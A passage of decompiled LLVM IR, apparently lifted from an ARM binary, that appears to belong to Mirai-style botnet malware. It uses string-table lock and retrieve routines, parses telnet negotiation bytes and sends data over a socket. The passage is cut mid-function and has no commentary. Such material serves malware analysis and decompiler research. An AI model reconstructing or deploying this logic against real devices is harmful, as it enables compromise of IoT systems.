  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f290 = add i32 %v0_f290, 1
  store i32 %v1_f290, i32* @r7, align 4
  %v1_f294 = call i32 @table_unlock_val(i32 9)
  store i32 %v2_f82c, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_f2a4 = call i32 @table_retrieve_val(i32 9, i32* nonnull %stack_var_-60)
  store i32 %v3_f2a4, i32* %r0.global-to-local, align 4
  %v3_f2a8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f2a8, i32* %r2.global-to-local, align 4
  store i32 %v3_f2a4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f2b4 = load i32, i32* @r6, align 4
  %v1_f2b4 = add i32 %v0_f2b4, 4
  %v2_f2b4 = inttoptr i32 %v1_f2b4 to i32*
  %v3_f2b4 = load i32, i32* %v2_f2b4, align 4
  store i32 %v3_f2b4, i32* %r0.global-to-local, align 4
  %v4_f2b8 = call i32 @__libc_send(i32 %v3_f2b4, i32 %v3_f2a4, i32 %v3_f2a8, i32 16384)
  store i32 %v4_f2b8, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19320.205 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f2c8 = load i32, i32* @r6, align 4
  %v1_f2c8 = add i32 %v0_f2c8, 4
  %v2_f2c8 = inttoptr i32 %v1_f2c8 to i32*
  %v3_f2c8 = load i32, i32* %v2_f2c8, align 4
  store i32 %v3_f2c8, i32* %r0.global-to-local, align 4
  %v4_f2cc = call i32 @__libc_send(i32 %v3_f2c8, i32 ptrtoint ([3 x i8]* @global_var_19320.205 to i32), i32 2, i32 16384)
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f2d4 = call i32 @table_lock_val(i32 9)
  store i32 %v1_f2d4, i32* %r0.global-to-local, align 4
  store i32 9, i32* @r3, align 4
  %v1_f2dc = load i32, i32* @r6, align 4
  %v2_f2dc = add i32 %v1_f2dc, 12
  %v3_f2dc = inttoptr i32 %v2_f2dc to i32*
  store i32 9, i32* %v3_f2dc, align 4
  br label %dec_label_pc_f114

dec_label_pc_f2e4:                                ; preds = %dec_label_pc_eff8
  %v1_f2e4 = add i32 %v0_eff8, 24
  %v2_f2e4 = inttoptr i32 %v1_f2e4 to i32*
  %v3_f2e4 = load i32, i32* %v2_f2e4, align 4
  store i32 %v3_f2e4, i32* %r1.global-to-local, align 4
  %v0_f2e8 = load i32, i32* @sb, align 4
  store i32 %v0_f2e8, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_f2f0166 = icmp eq i32 %v3_f2e4, 0
  store i1 %v3_f2f0166, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_f2f0166, i1* %cpsr_z.global-to-local, align 1
  %v6_f2f4173 = icmp sgt i32 %v3_f2e4, 0
  br i1 %v6_f2f4173, label %dec_label_pc_f2f8.preheader, label %dec_label_pc_f3a4

dec_label_pc_f2f0.loopexit:                       ; preds = %dec_label_pc_f314
  %v2_f31c = add i32 %v1_f31c, 2
  store i32 %v2_f31c, i32* @r4, align 4
  %v2_f320 = add i32 %v1_f320, 2
  store i32 %v2_f320, i32* @r7, align 4
  %v3_f2f0 = icmp uge i32 %v2_f320, %v1_f2f0
  store i1 %v3_f2f0, i1* %cpsr_c.global-to-local, align 1
  %v9_f2f0 = icmp eq i32 %v2_f320, %v1_f2f0
  store i1 %v9_f2f0, i1* %cpsr_z.global-to-local, align 1
  %v6_f2f4 = icmp slt i32 %v2_f320, %v1_f2f0
  br i1 %v6_f2f4, label %dec_label_pc_f2f8.preheader, label %dec_label_pc_f3a4

dec_label_pc_f2f8.preheader:                      ; preds = %dec_label_pc_f2e4, %dec_label_pc_f2f0.loopexit
  %v6_f3ac273 = phi i32 [ %v6_f3ac274, %dec_label_pc_f2f0.loopexit ], [ %v0_eff8, %dec_label_pc_f2e4 ]
  %v1_f320262 = phi i32 [ %v2_f320, %dec_label_pc_f2f0.loopexit ], [ 0, %dec_label_pc_f2e4 ]
  %v1_f304260 = phi i32 [ %v1_f2f0, %dec_label_pc_f2f0.loopexit ], [ %v3_f2e4, %dec_label_pc_f2e4 ]
  %v0_f2f8258 = phi i32 [ %v2_f31c, %dec_label_pc_f2f0.loopexit ], [ %v0_f2e8, %dec_label_pc_f2e4 ]
  br label %dec_label_pc_f2f8

dec_label_pc_f2f8:                                ; preds = %dec_label_pc_f2f8.preheader, %dec_label_pc_f388
  %v6_f3ac274 = phi i32 [ %v6_f3ac273, %dec_label_pc_f2f8.preheader ], [ %v0_f390, %dec_label_pc_f388 ]
  %v1_f320 = phi i32 [ %v1_f320262, %dec_label_pc_f2f8.preheader ], [ %v1_f394, %dec_label_pc_f388 ]
  %v1_f2f0 = phi i32 [ %v1_f304260, %dec_label_pc_f2f8.preheader ], [ %v3_f390, %dec_label_pc_f388 ]
  %v1_f31c = phi i32 [ %v0_f2f8258, %dec_label_pc_f2f8.preheader ], [ %v1_f39c, %dec_label_pc_f388 ]
  %v1_f2f8 = inttoptr i32 %v1_f31c to i8*
  %v2_f2f8 = load i8, i8* %v1_f2f8, align 1
  %v3_f2f8 = zext i8 %v2_f2f8 to i32
  store i32 %v3_f2f8, i32* @r3, align 4
  %v2_f2fc = icmp eq i8 %v2_f2f8, -1
  store i1 %v2_f2fc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f2fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f2fc, label %dec_label_pc_f304, label %dec_label_pc_f3a4

dec_label_pc_f304:                                ; preds = %dec_label_pc_f2f8
  %v0_f304 = load i32, i32* @sb, align 4
  %v2_f304 = add i32 %v0_f304, %v1_f2f0
  store i32 %v2_f304, i32* %r2.global-to-local, align 4
  %v1_f308 = add i32 %v1_f31c, 1
  store i32 %v1_f308, i32* @r5, align 4
  %v3_f30c = icmp uge i32 %v2_f304, %v1_f308
  store i1 %v3_f30c, i1* %cpsr_c.global-to-local, align 1
  %v9_f30c = icmp eq i32 %v2_f304, %v1_f308
  store i1 %v9_f30c, i1* %cpsr_z.global-to-local, align 1
  %v2_f310 = xor i1 %v3_f30c, true
  %v3_f310 = or i1 %v9_f30c, %v2_f310
  br i1 %v3_f310, label %dec_label_pc_f3a4, label %dec_label_pc_f314

dec_label_pc_f314:                                ; preds = %dec_label_pc_f304
  %v2_f314 = inttoptr i32 %v1_f308 to i8*
  %v3_f314 = load i8, i8* %v2_f314, align 1
  %v4_f314 = zext i8 %v3_f314 to i32
  store i32 %v4_f314, i32* @r3, align 4
  %v2_f318 = icmp eq i8 %v3_f314, -1
  store i1 %v2_f318, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f318, label %dec_label_pc_f2f0.loopexit, label %dec_label_pc_f328

dec_label_pc_f328:                                ; preds = %dec_label_pc_f314
  %v2_f328 = icmp ugt i8 %v3_f314, -4
  store i1 %v2_f328, i1* %cpsr_c.global-to-local, align 1
  %v7_f328 = icmp eq i8 %v3_f314, -3
  store i1 %v7_f328, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f328, label %dec_label_pc_f8bc, label %dec_label_pc_f330

dec_label_pc_f330:                                ; preds = %dec_label_pc_f328
  %v1_f330 = add i32 %v1_f31c, 2
  store i32 %v1_f330, i32* @r3, align 4
  %v3_f334 = icmp uge i32 %v2_f304, %v1_f330
  store i1 %v3_f334, i1* %cpsr_c.global-to-local, align 1
  %v9_f334 = icmp eq i32 %v2_f304, %v1_f330
  store i1 %v9_f334, i1* %cpsr_z.global-to-local, align 1
  %v2_f338 = xor i1 %v3_f334, true
  %v3_f338 = or i1 %v9_f334, %v2_f338
  br i1 %v3_f338, label %dec_label_pc_f3a4, label %dec_label_pc_f33c

dec_label_pc_f33c:                                ; preds = %dec_label_pc_f920, %bb454, %.thread138, %dec_label_pc_f330
  %v0_f33c = load i32, i32* @r5, align 4
  %v1_f33c = inttoptr i32 %v0_f33c to i8*
  %v2_f33c = load i8, i8* %v1_f33c, align 1
  %v3_f33c = zext i8 %v2_f33c to i32
  store i32 %v3_f33c, i32* %r3.global-to-local, align 4
  %v2_f340 = icmp ugt i8 %v2_f33c, -4
  store i1 %v2_f340, i1* %cpsr_c.global-to-local, align 1
  %v7_f340 = icmp eq i8 %v2_f33c, -3
  store i1 %v7_f340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f340, label %.thread96, label %dec_label_pc_f350

.thread96:                                        ; preds = %dec_label_pc_f33c
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f33c, align 1
  %v0_f34c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f34c.pr.pr, label %.thread99, label %.thread96.dec_label_pc_f350thread-pre-split_crit_edge

.thread96.dec_label_pc_f350thread-pre-split_crit_edge: ; preds = %.thread96
  %v0_f350.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f350

dec_label_pc_f350:                                ; preds = %dec_label_pc_f33c, %.thread96.dec_label_pc_f350thread-pre-split_crit_edge
  %v0_f350.pr = phi i32 [ %v0_f350.pr.pre, %.thread96.dec_label_pc_f350thread-pre-split_crit_edge ], [ %v3_f33c, %dec_label_pc_f33c ]
  %v2_f350 = icmp ugt i32 %v0_f350.pr, 250
  store i1 %v2_f350, i1* %cpsr_c.global-to-local, align 1
  %v7_f350 = icmp eq i32 %v0_f350.pr, 251
  store i1 %v7_f350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f350, label %bb433, label %.thread99

bb433:                                            ; preds = %dec_label_pc_f350
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f358 = load i32, i32* @r5, align 4
  %v4_f358 = inttoptr i32 %v3_f358 to i8*
  store i8 -3, i8* %v4_f358, align 1
  br label %.thread99

.thread99:                                        ; preds = %dec_label_pc_f350, %.thread96, %bb433
  %v0_f35c = load i32, i32* @r4, align 4
  %v1_f35c = add i32 %v0_f35c, 2
  %v2_f35c = inttoptr i32 %v1_f35c to i8*
  %v3_f35c = load i8, i8* %v2_f35c, align 1
  %v4_f35c = zext i8 %v3_f35c to i32
  store i32 %v4_f35c, i32* %r3.global-to-local, align 4
  %v2_f360 = icmp ugt i8 %v3_f35c, -4
  store i1 %v2_f360, i1* %cpsr_c.global-to-local, align 1
  %v7_f360 = icmp eq i8 %v3_f35c, -3
  store i1 %v7_f360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f360, label %.thread100, label %dec_label_pc_f370

.thread100:                                       ; preds = %.thread99
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_f35c, align 1
  %v0_f36c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f36c.pr.pr, label %.thread103, label %.thread100.dec_label_pc_f370thread-pre-split_crit_edge

.thread100.dec_label_pc_f370thread-pre-split_crit_edge: ; preds = %.thread100
  %v0_f370.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f370

dec_label_pc_f370:                                ; preds = %.thread99, %.thread100.dec_label_pc_f370thread-pre-split_crit_edge
  %v0_f370.pr = phi i32 [ %v0_f370.pr.pre, %.thread100.dec_label_pc_f370thread-pre-split_crit_edge ], [ %v4_f35c, %.thread99 ]
  %v2_f370 = icmp ugt i32 %v0_f370.pr, 250
  store i1 %v2_f370, i1* %cpsr_c.global-to-local, align 1
  %v7_f370 = icmp eq i32 %v0_f370.pr, 251
  store i1 %v7_f370, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f370, label %bb434, label %.thread103

bb434:                                            ; preds = %dec_label_pc_f370
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f378 = load i32, i32* @r4, align 4
  %v4_f378 = add i32 %v3_f378, 2
  %v5_f378 = inttoptr i32 %v4_f378 to i8*
  store i8 -3, i8* %v5_f378, align 1
  br label %.thread103

.thread103:                                       ; preds = %dec_label_pc_f370, %.thread100, %bb434
  %v0_f37c = load i32, i32* @r6, align 4
  %v1_f37c = add i32 %v0_f37c, 4
  %v2_f37c = inttoptr i32 %v1_f37c to i32*
  %v3_f37c = load i32, i32* %v2_f37c, align 4
  store i32 %v3_f37c, i32* %r0.global-to-local, align 4
  %v0_f380 = load i32, i32* @r4, align 4
  br label %dec_label_pc_f388

dec_label_pc_f388:                                ; preds = %dec_label_pc_fa34, %.thread103
  %v0_f38c = phi i32 [ %v3_fa48, %dec_label_pc_fa34 ], [ %v3_f37c, %.thread103 ]
  %storemerge4 = phi i32 [ %v2_f8d4, %dec_label_pc_fa34 ], [ %v0_f380, %.thread103 ]
  %storemerge3 = phi i32 [ 9, %dec_label_pc_fa34 ], [ 3, %.thread103 ]
  store i32 %storemerge4, i32* %r1.global-to-local, align 4
  store i32 %storemerge3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f38c = call i32 @__libc_send(i32 %v0_f38c, i32 %storemerge4, i32 %storemerge3, i32 16384)
  store i32 %v4_f38c, i32* %r0.global-to-local, align 4
  %v0_f390 = load i32, i32* @r6, align 4
  %v1_f390 = add i32 %v0_f390, 24
  %v2_f390 = inttoptr i32 %v1_f390 to i32*
  %v3_f390 = load i32, i32* %v2_f390, align 4
  store i32 %v3_f390, i32* %r1.global-to-local, align 4
  %v0_f394 = load i32, i32* @r7, align 4
  %v1_f394 = add i32 %v0_f394, 3
  store i32 %v1_f394, i32* @r7, align 4
  %v3_f398 = icmp uge i32 %v1_f394, %v3_f390
  store i1 %v3_f398, i1* %cpsr_c.global-to-local, align 1
  %v9_f398 = icmp eq i32 %v1_f394, %v3_f390
  store i1 %v9_f398, i1* %cpsr_z.global-to-local, align 1
  %v0_f39c = load i32, i32* @r4, align 4
  %v1_f39c = add i32 %v0_f39c, 3
  store i32 %v1_f39c, i32* @r4, align 4
  %v5_f3a0 = icmp slt i32 %v1_f394, %v3_f390
  br i1 %v5_f3a0, label %dec_label_pc_f2f8, label %dec_label_pc_f3a4

dec_label_pc_f3a4:                                ; preds = %dec_label_pc_f2f0.loopexit, %dec_label_pc_f2f8, %dec_label_pc_f388, %dec_label_pc_f330, %dec_label_pc_f304, %dec_label_pc_f2e4, %dec_label_pc_f8bc.dec_label_pc_f3a4.loopexit_crit_edge
  %v6_f3ac = phi i32 [ %v0_f8ec, %dec_label_pc_f8bc.dec_label_pc_f3a4.loopexit_crit_edge ], [ %v0_eff8, %dec_label_pc_f2e4 ], [ %v6_f3ac274, %dec_label_pc_f2f8 ], [ %v0_f390, %dec_label_pc_f388 ], [ %v6_f3ac274, %dec_label_pc_f330 ], [ %v6_f3ac274, %dec_label_pc_f304 ], [ %v6_f3ac274, %dec_label_pc_f2f0.loopexit ]
  %v0_f3a4 = phi i32 [ %v0_f3a4.pre.pre, %dec_label_pc_f8bc.dec_label_pc_f3a4.loopexit_crit_edge ], [ 0, %dec_label_pc_f2e4 ], [ %v1_f320, %dec_label_pc_f2f8 ], [ %v1_f394, %dec_label_pc_f388 ], [ %v1_f320, %dec_label_pc_f330 ], [ %v1_f320, %dec_label_pc_f304 ], [ %v2_f320, %dec_label_pc_f2f0.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f3a4 = icmp eq i32 %v0_f3a4, 0
  store i1 %v2_f3a4, i1* %cpsr_z.global-to-local, align 1
  %tmp435 = icmp slt i32 %v0_f3a4, 1
  br i1 %tmp435, label %dec_label_pc_f790, label %bb436

bb436:                                            ; preds = %dec_label_pc_f3a4
  store i32 3, i32* @r3, align 4
  %v7_f3ac = add i32 %v6_f3ac, 12
  %v8_f3ac = inttoptr i32 %v7_f3ac to i32*
  store i32 3, i32* %v8_f3ac, align 4
  br label %dec_label_pc_f790

dec_label_pc_f3b4:                                ; preds = %dec_label_pc_eff8
  %v1_f3b4 = add i32 %v0_eff8, 24
  %v2_f3b4 = inttoptr i32 %v1_f3b4 to i32*
  %v3_f3b4 = load i32, i32* %v2_f3b4, align 4
  store i32 %v3_f3b4, i32* %r2.global-to-local, align 4
  %v1_f3b8 = add i32 %v3_f3b4, -1
  store i32 %v1_f3b8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f3bc = icmp eq i32 %v1_f3b8, 0
  store i1 %v2_f3bc, i1* %cpsr_z.global-to-local, align 1
  %tmp437 = icmp slt i32 %v1_f3b8, 1
  br i1 %tmp437, label %dec_label_pc_ef7c.backedge.thread, label %dec_label_pc_f3c4

dec_label_pc_f3c4:                                ; preds = %dec_label_pc_f3b4
  %v2_f3c4 = add i32 %v1_f3b8, %v0_eff8
  store i32 %v2_f3c4, i32* %r3.global-to-local, align 4
  %v1_f3c8 = add i32 %v2_f3c4, 28
  %v2_f3c8 = inttoptr i32 %v1_f3c8 to i8*
  %v3_f3c8 = load i8, i8* %v2_f3c8, align 1
  %v4_f3c8 = zext i8 %v3_f3c8 to i32
  store i32 %v4_f3c8, i32* %r3.global-to-local, align 4
  %v2_f3cc = icmp ugt i8 %v3_f3c8, 61
  store i1 %v2_f3cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f3cc = icmp eq i8 %v3_f3c8, 62
  store i1 %v7_f3cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3cc, label %dec_label_pc_f430, label %bb438

bb438:                                            ; preds = %dec_label_pc_f3c4
  %v3_f3d0 = icmp ugt i8 %v3_f3c8, 57
  store i1 %v3_f3d0, i1* %cpsr_c.global-to-local, align 1
  %v8_f3d0 = icmp eq i8 %v3_f3c8, 58
  store i1 %v8_f3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f3d0, label %dec_label_pc_f430, label %dec_label_pc_f3d8

dec_label_pc_f3d8:                                ; preds = %bb438
  %v2_f3d8 = icmp ugt i8 %v3_f3c8, 35
  store i1 %v2_f3d8, i1* %cpsr_c.global-to-local, align 1
  %v7_f3d8 = icmp eq i8 %v3_f3c8, 36
  store i1 %v7_f3d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3d8, label %dec_label_pc_f430, label %dec_label_pc_f3e0

dec_label_pc_f3e0:                                ; preds = %dec_label_pc_f3d8
  %v2_f3e0 = icmp ugt i8 %v3_f3c8, 34
  store i1 %v2_f3e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f3e0 = icmp eq i8 %v3_f3c8, 35
  store i1 %v7_f3e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3e0, label %dec_label_pc_f430, label %dec_label_pc_f3e8

dec_label_pc_f3e8:                                ; preds = %dec_label_pc_f3e0
  %v2_f3e8 = icmp ugt i8 %v3_f3c8, 36
  store i1 %v2_f3e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f3e8 = icmp eq i8 %v3_f3c8, 37
  store i1 %v7_f3e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3e8, label %dec_label_pc_f430, label %dec_label_pc_f418.preheader

dec_label_pc_f418.preheader:                      ; preds = %dec_label_pc_f3e8
  %v3_f3ec = add i32 %v0_eff8, 28
  %v2_f3f0 = add i32 %v3_f3ec, %v3_f3b4
  store i32 %v2_f3f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f418

dec_label_pc_f3fc:                                ; preds = %bb439
  %v2_f3fc = icmp ugt i8 %v3_f420, 35
  store i1 %v2_f3fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f3fc = icmp eq i8 %v3_f420, 36
  store i1 %v7_f3fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3fc, label %dec_label_pc_f430, label %dec_label_pc_f404

dec_label_pc_f404:                                ; preds = %dec_label_pc_f3fc
  %v2_f404 = icmp ugt i8 %v3_f420, 34
  store i1 %v2_f404, i1* %cpsr_c.global-to-local, align 1
  %v7_f404 = icmp eq i8 %v3_f420, 35
  store i1 %v7_f404, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f404, label %dec_label_pc_f430, label %dec_label_pc_f40c

dec_label_pc_f40c:                                ; preds = %dec_label_pc_f404
  %v2_f40c = icmp ugt i8 %v3_f420, 36
  store i1 %v2_f40c, i1* %cpsr_c.global-to-local, align 1
  %v7_f40c = icmp eq i8 %v3_f420, 37
  store i1 %v7_f40c, i1* %cpsr_z.global-to-local, align 1
  %v1_f410 = add i32 %v0_f410, -1
  store i32 %v1_f410, i32* %r3.global-to-local, align 4
  br i1 %v7_f40c, label %dec_label_pc_f430, label %dec_label_pc_f418

dec_label_pc_f418:                                ; preds = %dec_label_pc_f418.preheader, %dec_label_pc_f40c
  %v0_f410 = phi i32 [ %v2_f3f0, %dec_label_pc_f418.preheader ], [ %v1_f410, %dec_label_pc_f40c ]
  %v0_f418 = phi i32 [ %v1_f3b8, %dec_label_pc_f418.preheader ], [ %v1_f418, %dec_label_pc_f40c ]
  %v1_f418 = add i32 %v0_f418, -1
  store i32 %v1_f418, i32* %r1.global-to-local, align 4
  %v2_f418 = icmp ne i32 %v0_f418, 0
  store i1 %v2_f418, i1* %cpsr_c.global-to-local, align 1
  %v7_f418 = icmp eq i32 %v0_f418, 1
  store i1 %v7_f418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f418, label %dec_label_pc_ef7c.backedge.thread561, label %dec_label_pc_f420

dec_label_pc_f420:                                ; preds = %dec_label_pc_f418
  %v1_f420 = add i32 %v0_f410, -2
  %v2_f420 = inttoptr i32 %v1_f420 to i8*
  %v3_f420 = load i8, i8* %v2_f420, align 1
  %v4_f420 = zext i8 %v3_f420 to i32
  store i32 %v4_f420, i32* %r2.global-to-local, align 4
  %v2_f424 = icmp ugt i8 %v3_f420, 61
  store i1 %v2_f424, i1* %cpsr_c.global-to-local, align 1
  %v7_f424 = icmp eq i8 %v3_f420, 62
  store i1 %v7_f424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f424, label %dec_label_pc_f430, label %bb439

bb439:                                            ; preds = %dec_label_pc_f420
  %v3_f428 = icmp ugt i8 %v3_f420, 57
  store i1 %v3_f428, i1* %cpsr_c.global-to-local, align 1
  %v8_f428 = icmp eq i8 %v3_f420, 58
  store i1 %v8_f428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f428, label %dec_label_pc_f430, label %dec_label_pc_f3fc

dec_label_pc_f430:                                ; preds = %dec_label_pc_f420, %bb439, %dec_label_pc_f40c, %dec_label_pc_f404, %dec_label_pc_f3fc, %dec_label_pc_f3e8, %dec_label_pc_f3c4, %dec_label_pc_f3e0, %dec_label_pc_f3d8, %bb438
  %v0_f434 = phi i32 [ %v1_f3b8, %dec_label_pc_f3e8 ], [ %v1_f3b8, %dec_label_pc_f3c4 ], [ %v1_f3b8, %dec_label_pc_f3e0 ], [ %v1_f3b8, %dec_label_pc_f3d8 ], [ %v1_f3b8, %bb438 ], [ %v1_f418, %dec_label_pc_f3fc ], [ %v1_f418, %dec_label_pc_f404 ], [ %v1_f418, %dec_label_pc_f40c ], [ %v1_f418, %bb439 ], [ %v1_f418, %dec_label_pc_f420 ]
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_f434 = add i32 %v0_f434, 1
  store i32 %v1_f434, i32* @r7, align 4
  %v1_f438 = call i32 @table_unlock_val(i32 8)
  store i32 %v2_f82c, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_f448 = call i32 @table_retrieve_val(i32 8, i32* nonnull %stack_var_-60)
  store i32 %v3_f448, i32* %r0.global-to-local, align 4
  %v3_f44c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f44c, i32* %r2.global-to-local, align 4
  store i32 %v3_f448, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f458 = load i32, i32* @r6, align 4
  %v1_f458 = add i32 %v0_f458, 4
  %v2_f458 = inttoptr i32 %v1_f458 to i32*
  %v3_f458 = load i32, i32* %v2_f458, align 4
  store i32 %v3_f458, i32* %r0.global-to-local, align 4
  %v4_f45c = call i32 @__libc_send(i32 %v3_f458, i32 %v3_f448, i32 %v3_f44c, i32 16384)
  store i32 %v4_f45c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19320.205 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f46c = load i32, i32* @r6, align 4
  %v1_f46c = add i32 %v0_f46c, 4
  %v2_f46c = inttoptr i32 %v1_f46c to i32*
  %v3_f46c = load i32, i32* %v2_f46c, align 4
  store i32 %v3_f46c, i32* %r0.global-to-local, align 4
  %v4_f470 = call i32 @__libc_send(i32 %v3_f46c, i32 ptrtoint ([3 x i8]* @global_var_19320.205 to i32), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_f478 = call i32 @table_lock_val(i32 8)
  store i32 %v1_f478, i32* %r0.global-to-local, align 4
  store i32 7, i32* @r3, align 4
  %v1_f480 = load i32, i32* @r6, align 4
  %v2_f480 = add i32 %v1_f480, 12
  %v3_f480 = inttoptr i32 %v2_f480 to i32*
  store i32 7, i32* %v3_f480, align 4
  br label %dec_label_pc_f114

dec_label_pc_f488:                                ; preds = %dec_label_pc_eff8
  %v1_f488 = add i32 %v0_eff8, 24
  %v2_f488 = inttoptr i32 %v1_f488 to i32*
  %v3_f488 = load i32, i32* %v2_f488, align 4
  store i32 %v3_f488, i32* %r2.global-to-local, align 4
  %v1_f48c = add i32 %v3_f488, -1
  store i32 %v1_f48c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f490 = icmp eq i32 %v1_f48c, 0
  store i1 %v2_f490, i1* %cpsr_z.global-to-local, align 1
  %tmp440 = icmp slt i32 %v1_f48c, 1
  br i1 %tmp440, label %dec_label_pc_ef7c.backedge.thread, label %dec_label_pc_f498

dec_label_pc_f498:                                ; preds = %dec_label_pc_f488
  %v2_f498 = add i32 %v1_f48c, %v0_eff8
  store i32 %v2_f498, i32* %r3.global-to-local, align 4
  %v1_f49c = add i32 %v2_f498, 28
  %v2_f49c = inttoptr i32 %v1_f49c to i8*
  %v3_f49c = load i8, i8* %v2_f49c, align 1
  %v4_f49c = zext i8 %v3_f49c to i32
  store i32 %v4_f49c, i32* %r3.global-to-local, align 4
  %v2_f4a0 = icmp ugt i8 %v3_f49c, 61
  store i1 %v2_f4a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f4a0 = icmp eq i8 %v3_f49c, 62
  store i1 %v7_f4a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4a0, label %dec_label_pc_f504, label %bb441

bb441:                                            ; preds = %dec_label_pc_f498
  %v3_f4a4 = icmp ugt i8 %v3_f49c, 57
  store i1 %v3_f4a4, i1* %cpsr_c.global-to-local, align 1
  %v8_f4a4 = icmp eq i8 %v3_f49c, 58
  store i1 %v8_f4a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f4a4, label %dec_label_pc_f504, label %dec_label_pc_f4ac

dec_label_pc_f4ac:                                ; preds = %bb441
  %v2_f4ac = icmp ugt i8 %v3_f49c, 35
  store i1 %v2_f4ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f4ac = icmp eq i8 %v3_f49c, 36
  store i1 %v7_f4ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4ac, label %dec_label_pc_f504, label %dec_label_pc_f4b4

dec_label_pc_f4b4:                                ; preds = %dec_label_pc_f4ac
  %v2_f4b4 = icmp ugt i8 %v3_f49c, 34
  store i1 %v2_f4b4, i1* %cpsr_c.global-to-local, align 1
  %v7_f4b4 = icmp eq i8 %v3_f49c, 35
  store i1 %v7_f4b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4b4, label %dec_label_pc_f504, label %dec_label_pc_f4bc

dec_label_pc_f4bc:                                ; preds = %dec_label_pc_f4b4
  %v2_f4bc = icmp ugt i8 %v3_f49c, 36
  store i1 %v2_f4bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f4bc = icmp eq i8 %v3_f49c, 37
  store i1 %v7_f4bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4bc, label %dec_label_pc_f504, label %dec_label_pc_f4ec.preheader

dec_label_pc_f4ec.preheader:                      ; preds = %dec_label_pc_f4bc
  %v3_f4c0 = add i32 %v0_eff8, 28
  %v2_f4c4 = add i32 %v3_f4c0, %v3_f488
  store i32 %v2_f4c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f4ec

dec_label_pc_f4d0:                                ; preds = %bb442
  %v2_f4d0 = icmp ugt i8 %v3_f4f4, 35
  store i1 %v2_f4d0, i1* %cpsr_c.global-to-local, align 1
  %v7_f4d0 = icmp eq i8 %v3_f4f4, 36
  store i1 %v7_f4d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4d0, label %dec_label_pc_f504, label %dec_label_pc_f4d8

dec_label_pc_f4d8:                                ; preds = %dec_label_pc_f4d0
  %v2_f4d8 = icmp ugt i8 %v3_f4f4, 34
  store i1 %v2_f4d8, i1* %cpsr_c.global-to-local, align 1
  %v7_f4d8 = icmp eq i8 %v3_f4f4, 35
  store i1 %v7_f4d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f4d8, label %dec_label_pc_f504, label %dec_label_pc_f4e0

dec_label_pc_f4e0:                                ; preds = %dec_label_pc_f4d8
  %v2_f4e0 = icmp ugt i8 %v3_f4f4, 36
  store i1 %v2_f4e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f4e0 = icmp eq i8 %v3_f4f4, 37
